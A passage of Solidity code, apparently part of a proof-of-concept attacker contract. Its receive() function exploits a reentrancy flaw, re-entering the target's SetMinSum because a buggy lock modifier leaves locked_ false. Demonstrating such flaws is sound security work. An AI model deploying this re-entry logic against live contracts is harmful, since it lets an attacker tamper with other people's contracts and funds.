        newMinSum = _newMinSum;
        entered = false;
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            // Attempt to re-enter via SetMinSum, which the buggy modifier will allow because locked_ stays false
            try target.SetMinSum(newMinSum) {} catch {}
            entered = false;
        }
    }
